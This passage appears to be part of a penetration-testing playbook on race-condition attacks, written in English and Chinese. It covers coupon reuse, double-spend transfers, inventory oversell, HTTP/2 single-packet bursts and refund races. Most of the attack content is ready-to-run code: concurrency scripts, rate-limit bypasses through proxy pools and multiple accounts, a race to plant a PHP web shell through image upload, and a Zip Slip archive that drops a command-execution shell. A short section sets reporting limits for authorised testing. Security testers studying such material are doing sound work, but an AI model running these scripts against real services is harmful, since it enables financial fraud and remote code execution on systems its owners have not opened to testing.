### Quick Audit Checklist

```text
□ SHOW TRANSACTION ISOLATION LEVEL — what level is the database running?
□ Does the hot path use SELECT ... FOR UPDATE or explicit row locks?
□ Is the check-then-act sequence inside a single transaction?
□ Are UNIQUE constraints enforced on the critical state table?
□ Multi-instance deployment: is there a distributed lock (Redis SETNX / Zookeeper)?
```

---

## 11. LIMIT-OVERRUN ATTACK PATTERNS

### 11.1 Coupon / Promo Code Reuse

```text
Target:   POST /api/apply-coupon {"code":"SUMMER50"}
Expected: One use per user
Attack:   20 parallel identical requests
Evidence: Multiple 200 responses, final order total = N × discount applied
```

Variations: same coupon across different cart items; apply-coupon + checkout in parallel (coupon consumed only at checkout).

### 11.2 Vote / Rating Manipulation

```text
Target:   POST /api/vote {"post_id":123,"direction":"up"}
Expected: One vote per user per post
Attack:   50 parallel vote requests
Evidence: Vote count += N, or DB shows multiple vote rows for same user+post
```

### 11.3 Balance Double-Spend

```text
Target:   POST /api/transfer {"to":"attacker","amount":100}
Balance:  Exactly 100
Attack:   2+ parallel transfers
Evidence: Both succeed, sender balance goes negative, recipient receives 200
```

Higher-value variant: withdrawal to external system (crypto, bank wire) where reversal is difficult.

### 11.4 Inventory Oversell

```text
Target:   POST /api/purchase {"item_id":"limited_edition","qty":1}
Stock:    1 remaining
Attack:   20 parallel purchase requests
Evidence: Multiple orders created, stock counter goes negative
```

Compound attack: add-to-cart and checkout are separate steps, each checking inventory independently.

### 11.5 Referral / Signup Bonus

```text
Target:   POST /api/referral/claim {"code":"REF_ABC"}
Expected: One claim per referred user
Attack:   Parallel claims from same session
Evidence: Bonus credited to referrer multiple times
```

---

## 12. SINGLE-PACKET MULTI-ENDPOINT ATTACK

Instead of N copies of the same request, send requests to **different endpoints** in one HTTP/2 single-packet burst. This widens the TOCTOU window by hitting both the check and use paths simultaneously.

### Pattern 1: State-check + State-mutate

```text
Single TCP segment:
  Stream 1: GET  /api/balance       ← probe pre-state
  Stream 3: POST /api/transfer      ← mutate
  Stream 5: POST /api/transfer      ← mutate (duplicate)
  Stream 7: GET  /api/balance       ← probe post-state
```

Balance inconsistency between stream 1 and stream 7 confirms the race window was hit.

### Pattern 2: Cross-resource race

```text
Single TCP segment:
  Stream 1: POST /api/coupon/apply   ← apply discount
  Stream 3: POST /api/order/checkout ← finalize order
```

If coupon application and checkout check prices independently, the discount may apply after checkout has locked the price.

### Pattern 3: Auth verification + Privileged action

```text
Single TCP segment:
  Stream 1: POST /api/email/verify?token=TOKEN  ← verify email
  Stream 3: POST /api/account/upgrade            ← requires verified email
```

Upgrade may succeed during the brief window where verification is processing but not yet committed.

### Practical setup

Burp Repeater: add requests targeting **different paths** to the same group → "Send group (single packet)".

```python
headers_balance = [(':method','GET'), (':path','/api/balance'), ...]
headers_transfer = [(':method','POST'), (':path','/api/transfer'), ...]

all_headers = [headers_balance] + [headers_transfer]*5 + [headers_balance]
all_bodies = [b''] + [b'{"to":"attacker","amount":100}']*5 + [b'']

h2_conn.send_multiple_requests_at_once(all_headers, body_list=all_bodies)
```

---

## Related

- **business-logic-vulnerabilities** — workflow, coupon abuse, and logic-first checklists (`logic-race.md`).


---

## 补充与进阶


---

## 1. 检测与探针（前文直接进场景，缺“先测窗口”）

### 1.1 单请求时间分析

```bash
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{time_total}\n" -X POST "https://target/api/like" \
    -H "Cookie: session=xxx" -d "post_id=123"
done
```

- 响应 > 200ms → 可能存在锁/队列 → 窗口小
- 响应 < 50ms → 可能无锁 → 窗口大

### 1.2 并发探针

```python
import requests, concurrent.futures

def send(i):
    r = requests.post("https://target/api/action",
                      headers={"Cookie": "session=xxx"},
                      json={"target_id": "123"})
    return i, r.status_code, r.json()

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as e:
    for i, code, resp in e.map(send, range(10)):
        print(i, code, resp)
```

10 并发全 200 且效果叠加 → 竞态存在。

### 1.3 窗口大小探测

```bash
for delay in 100 50 20 10 5 2 1 0; do
  curl -s -o /dev/null "https://target/api/check" &
  sleep $(echo "scale=3; $delay/1000" | bc)
  curl -s -o /dev/null "https://target/api/check" &
  wait
done
```

或用 `ab -n 100 -c 20` 看成功率随并发度的变化。

> 前文直接给并发脚本，但没有“先测响应时间/窗口大小/防御类型”的探针步骤；这里补上。

---

## 2. 工具对比（前文有 Turbo/h2load/asyncio，缺对比与替代）

| 工具 | 并发能力 | 适用 |
|---|---|---|
| Turbo Intruder | 3000+ RPS | 首选，图形化 + gate |
| Python asyncio | 10000+ RPS | 自定义逻辑 |
| `xargs -P` | ~50 并发 | 快速验证，无额外工具 |
| `ab` | 高 | 纯 HTTP 压测，间接发现竞态 |
| `wrk` / `wrk2` | 极高 | 压测识别窗口 |
| race-the-web | 专用 | 竞态专项 |

```bash
seq 1 50 | xargs -P 20 -I {} curl -s -X POST "https://target/api/like" \
  -H "Cookie: session=xxx" -d "post_id=123" -o /dev/null -w "%{http_code}\n"
```

> 前文有 Turbo/h2load/asyncio/curl+parallel，但没有 `ab`/`wrk`/`race-the-web`/`xargs -P` 的对比。

---

## 3. 防御特征识别（前文有“防护检测”简版，缺特征表）

| 防御 | 响应特征 | 绕过思路 |
|---|---|---|
| 乐观锁（version） | 返回 `version`，修改需带同版本 | 竞争 version 检查 |
| 悲观锁（SELECT ... FOR UPDATE） | 第二个请求明显延迟 | 找无锁的关联操作 |
| 分布式锁（Redis SETNX） | 409/429 | 单连接多请求 / 换路径 |
| 令牌桶限流 | `X-RateLimit-Remaining` | IP/Session 轮换、慢速竞争 |

前文 §7 有简单判断代码，但没有这张特征→绕过表。

---

## 4. 绕过技巧（前文英文补充有单包/多端点，缺连接/慢速/多账号）

### 4.1 单 TCP 连接多请求（绕 IP 限流）

```python
import socket
s = socket.socket()
s.connect((host, port))
for req in requests:
    s.send(req.encode())
resp = s.recv(65535)
```

### 4.2 慢速竞争（避开速率限制）

```bash
# 假设窗口 ~50ms，间隔 25ms 发
for i in $(seq 1 10); do
  curl -X POST "https://target/api/action" -H "Cookie: session=xxx" -d "data=value" &
  sleep 0.025
done
```

### 4.3 多账号协同

```bash
# 主号 A + 多个小号并发接受邀请
for session in "${small_sessions[@]}"; do
  curl -X POST "https://target/api/invite/accept" \
    -H "Cookie: session=$session" -d "invite_code=MAIN_CODE" &
done
```

### 4.4 设备指纹限制 → 代理池

```bash
for i in $(seq 1 10); do
  curl -x "http://proxy_pool_$i:8080" -X POST "https://target/api/coupon/receive" \
    -H "Cookie: session=user_$i" -d "coupon_id=NEWUSER50" &
done
```

> 前文有“单连接多请求”的英文概念和 HTTP/1.1 last-byte，但没有以上具体脚本；补上。

---

## 5. 场景补充（前文未展开的竞态）

### 5.1 图片处理竞态

```bash
# 上传含 PHP 的图片 → 缩略图生成期间访问原图
curl -F "image=@shell.jpg" "https://target/upload-avatar"
while true; do
  curl -s "https://target/uploads/avatars/shell.jpg?cmd=id" | grep uid && break
done
```

### 5.2 Zip Slip + 竞态

```bash
mkdir tmp && cd tmp
echo '<?php system($_GET[1]);?>' > ../../../shell.php
zip -r evil.zip ../../../shell.php
curl -F "archive=@tmp/evil.zip" "https://target/import" &
sleep 0.5
curl "https://target/shell.php?1=id"
```

### 5.3 退款并发

```python
# Turbo Intruder: 10 个退款请求同一 gate
for i in range(10):
    engine.queue(target.req, gate='refund')
engine.openGate('refund')
# 期望退 1 次，实际可能退 10 次
```

### 5.4 登录锁定绕过

```text
5 次失败锁定 30 分钟 → 并发 6 次，第 6 次可能在锁定生效前发出
```

> 前文有文件上传竞态、多步流程、验证码并发；这里补图片处理、Zip Slip、退款、登录锁定四种。

---

## 6. 报告门槛（前文开头有纪律，补一条明确边界）

- 竞态必须造成**真实重复/超额/负数/状态错乱**才写。
- 纯短信轰炸、纯验证码发送、纯点赞数 +1 不计分（除非能换成资损/接管/权限）。
- 证据：测试前后余额/库存/券数截图、并发请求、服务端重复记录、时间。
- 护网：并发数 ≤ 50，不压测生产；先报备；测试后恢复/上报。